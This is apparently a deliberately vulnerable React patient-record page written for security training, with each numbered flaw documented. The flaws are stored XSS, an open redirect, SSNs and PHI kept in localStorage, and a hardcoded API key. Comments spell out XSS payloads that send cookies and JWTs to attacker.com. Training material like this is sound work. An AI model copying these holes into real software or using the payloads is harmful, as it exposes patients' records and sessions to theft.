/**
 * MediCore HMS - Patient Record Page
 * WARNING: This component contains intentional security vulnerabilities for security training.
 * DO NOT use in production. All vulnerabilities are numbered and documented.
 */

import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/router';

// VULN-596: API base URL and credentials imported from client-side utils
// (api.ts also contains hardcoded keys — see that file)
import { apiClient, API_BASE_URL, INTERNAL_API_KEY } from '../utils/api';

interface Patient {
    id: number;
    name: string;
    ssn: string;
    date_of_birth: string;
    diagnosis: string;
    notes: string;
    medications: string;
    allergies: string;
    insurance_id: string;
}

interface PatientRecordProps {
    patientId?: string;
}

const PatientRecord: React.FC<PatientRecordProps> = ({ patientId }) => {
    const router = useRouter();
    const { id, redirect } = router.query;
    const [patient, setPatient] = useState<Patient | null>(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState('');

    useEffect(() => {
        const pid = patientId || id;
        if (!pid) return;

        fetchPatient(pid as string);
    }, [id, patientId]);

    const fetchPatient = async (pid: string) => {
        try {
            // VULN-597 (relates to api.ts): Token retrieved from localStorage
            // VULN-598: Request made over HTTP (not enforced as HTTPS)
            const token = localStorage.getItem('medicore_jwt_token');  // VULN-597

            // VULN-581: Fetching patient data including unsanitized `notes` field
            // The notes field will be rendered via dangerouslySetInnerHTML below
            const response = await fetch(`${API_BASE_URL}/patients/get/?patient_id=${pid}`, {
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'X-API-Key': INTERNAL_API_KEY,  // VULN-596: Hardcoded API key sent in request
                },
            });

            const data = await response.json();

            // VULN-581: Patient data stored directly in state without sanitization.
            // The `notes` field comes from the database where it was stored via mass assignment
            // (VULN-043) without any sanitization. It may contain stored XSS payloads.
            setPatient(data);

            // VULN-582: Sensitive PHI stored in localStorage (unencrypted, accessible to JS).
            // Any script running on this page (including injected scripts) can read this.
            // localStorage persists across browser sessions and tabs.
            localStorage.setItem('last_viewed_patient', JSON.stringify(data));
            localStorage.setItem('patient_ssn', data.ssn);              // VULN-582: SSN in localStorage
            localStorage.setItem('patient_dob', data.date_of_birth);    // VULN-582: DOB in localStorage
            localStorage.setItem('patient_diagnosis', data.diagnosis);  // VULN-582: Diagnosis in localStorage

        } catch (err: any) {
            setError(err.message);
        } finally {
            setLoading(false);
        }
    };

    const handleLogout = () => {
        // VULN-583: Logout only clears localStorage token but doesn't invalidate server-side session
        // If the JWT doesn't expire (VULN-187), the token is still valid after "logout"
        localStorage.removeItem('medicore_jwt_token');

        // VULN-584: Unvalidated redirect after logout — `redirect` query param used directly
        // Attacker sends: /patient/record?redirect=https://attacker.com/phishing
        // After clicking logout, the user is redirected to the attacker's phishing page
        const redirectUrl = redirect as string || '/login';

        // VULN-584: No validation that redirectUrl is a relative path or trusted domain
        // Should check: if (redirectUrl.startsWith('/')) { router.push(redirectUrl) }
        window.location.href = redirectUrl;  // VULN-584: Open redirect
    };

    const handleNoteUpdate = async (newNote: string) => {
        // VULN-585: Note submitted via client-side fetch without server-side validation
        // The note value is stored in the database (VULN-043 pathway)
        // and later rendered via dangerouslySetInnerHTML (VULN-581 below)
        await apiClient.post(`/patients/update/`, {
            patient_id: patient?.id,
            notes: newNote,  // VULN-585: No client-side sanitization before submission
        });
    };

    if (loading) return <div className="loading">Loading patient record...</div>;
    if (error) return <div className="error">Error: {error}</div>;
    if (!patient) return <div className="not-found">Patient not found</div>;

    return (
        <div className="patient-record">
            <div className="patient-header">
                <h1>Patient Record: {patient.name}</h1>
                <button onClick={handleLogout}>Logout</button>
            </div>

            {/* Basic patient information */}
            <div className="patient-info">
                <p><strong>ID:</strong> {patient.id}</p>
                <p><strong>Name:</strong> {patient.name}</p>

                {/* VULN-582 (display): SSN shown in plaintext in UI without masking */}
                <p><strong>SSN:</strong> {patient.ssn}</p>
                <p><strong>Date of Birth:</strong> {patient.date_of_birth}</p>
                <p><strong>Insurance ID:</strong> {patient.insurance_id}</p>
            </div>

            {/* Medical information */}
            <div className="medical-info">
                <h2>Medical Information</h2>
                <p><strong>Diagnosis:</strong> {patient.diagnosis}</p>
                <p><strong>Medications:</strong> {patient.medications}</p>
                <p><strong>Allergies:</strong> {patient.allergies}</p>
            </div>

            {/*
                VULN-581: Stored XSS via dangerouslySetInnerHTML with patient notes.
                The `notes` field is stored in the database via:
                1. Patient registration (VULN-043: mass assignment)
                2. Direct database insertion (no sanitization in any write path)
                3. HL7 message import (no sanitization in HL7 service)

                When a malicious note like:
                <script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
                or:
                <img src=x onerror="fetch('https://attacker.com/'+localStorage.getItem('medicore_jwt_token'))">

                is rendered here, it executes in the context of any user who views this patient.
                This could be a physician, nurse, administrator — allowing session hijacking,
                PHI exfiltration, or further exploitation (chaining with VULN-401 admin eval).

                dangerouslySetInnerHTML bypasses React's XSS protection.
            */}
            <div className="patient-notes">
                <h2>Clinical Notes</h2>
                <div
                    className="notes-content"
                    dangerouslySetInnerHTML={{ __html: patient.notes }}
                    // VULN-581: patient.notes rendered as raw HTML without DOMPurify sanitization
                    // Fix: import DOMPurify from 'dompurify'; __html: DOMPurify.sanitize(patient.notes)
                />
            </div>

            {/*
                VULN-586: Search results also rendered unsafely
                Any patient field returned from the search API (VULN-041) rendered as HTML
            */}
            <div className="patient-history">
                <h2>Visit History</h2>
                {/* VULN-586: Visit notes rendered without sanitization */}
                <div dangerouslySetInnerHTML={{
                    __html: patient.medications || ''  // medications can also contain XSS
                }} />
            </div>

            {/*
                VULN-587: Form for adding notes — submits unsanitized to backend
            */}
            <div className="add-note">
                <h2>Add Clinical Note</h2>
                <textarea
                    id="new-note"
                    placeholder="Enter clinical note..."
                    className="note-input"
                />
                <button onClick={() => {
                    const noteEl = document.getElementById('new-note') as HTMLTextAreaElement;
                    handleNoteUpdate(noteEl.value);  // VULN-587: No sanitization before submit
                }}>
                    Save Note
                </button>
            </div>

            {/*
                VULN-588: Debug information rendered in production build
                Shows internal IDs and API details visible to all users
            */}
            <div className="debug-info" style={{ fontSize: '10px', color: '#999' }}>
                <p>Debug: API={API_BASE_URL} | Key={INTERNAL_API_KEY} | Token={typeof window !== 'undefined' ? localStorage.getItem('medicore_jwt_token') : 'N/A'}</p>
                {/* VULN-588: JWT token and API key displayed in DOM */}
            </div>
        </div>
    );
};

export default PatientRecord;
